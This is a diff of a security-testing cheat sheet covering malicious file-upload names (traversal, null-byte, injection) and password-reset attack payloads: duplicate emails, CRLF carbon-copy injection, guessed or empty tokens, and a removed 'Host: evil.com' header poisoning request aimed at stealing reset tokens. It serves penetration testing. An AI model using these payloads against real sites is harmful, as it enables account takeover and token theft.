@@ -14,99 +14,27 @@
 |../../file.png|directory traversal|
 |file.'svg|invalid extension|
 
-
-`.htaccess`
-
-`file.svg`
-
-`file.SVg`
-
-`file.png.svg`
-
-`file.php%00.png`
-
-`file.png' or '1'='1`
-
-`../../file.png`
-
-`file.'svg`
-
 ## Password Reset
 
-```
-POST /reset  
-email=victim@tld.xyz&email=hacker@tld.xyz
-```
+### Parameter payloads
+| Payload | Description |
+|----------|-------------|
+|email=victim@xyz.tld&email=hacker@xyz.tld|double parameter|
+|email=victim@xyz.tld%0a%0dcc:hacker@xyz.tld|carbon copy parameter|
+|email=victim@xyz.tld,hacker@xyz.tld|colon separator|
+|email=victim@xyz.tld%20hacker@xyz.tld|space separator|
+|email=victim@xyz.tld\|hacker@xyz.tld|pipe separator|
+|email=victim|no domain or tld|
+|email=victim@xyz|no tld|
+|{"email":["victim@tld.xyz","hacker@tld.xyz"]}|json multiple email table|
 
-```
-POST /reset  
-email=victim@tld.xyz&token=$BF$
-```
-
-```
-POST /reset  
-email=victim@tld.xyz&token=
-```
-
-```
-POST /reset  
-email=victim@tld.xyz&token=0000000
-```
-
-```
-POST /reset  
-email=victim@tld.xyz&token=nul
-```
-
-```
-POST /reset  
-email=victim@tld.xyz&token=nil
-```
-
-```
-POST /reset  
-email=victim@tld.xyz&token=HACKER-TOKEN
-```
-
-```
-POST /reset  
-email=victim@tld.xyz%0a%0dcc:hacker@tld.xyz
-```
-
-```
-POST /reset  
-email=victim@tld.xyz,hacker@tld.xyz
-```
-
-```
-POST /reset  
-email=victim@tld.xyz%20hacker@tld.xyz
-```
-
-```
-POST /reset  
-email=victim@tld.xyz|hacker@tld.xyz
-```
-
-```
-POST /reset  
-email=victim
-```
-
-```
-POST /reset  
-email=victim@tld
-```
-
-```
-POST /reset  
-Host: evil.com
-```
-
-```
-POST /reset
-{"email":["victim@tld.xyz","hacker@tld.xyz"]}
-```
+### Related other cases
+| Technique | Goal |
+|----------|-------------|
+|reset token modification|account takeover|
+|body response token leak|account takeover|
+|token guess or bruteforce (timestamp, userid)|account takeover|
+|modify header host domain|host reflected in mail and steal token|
 
 **Check body response for password token**
 
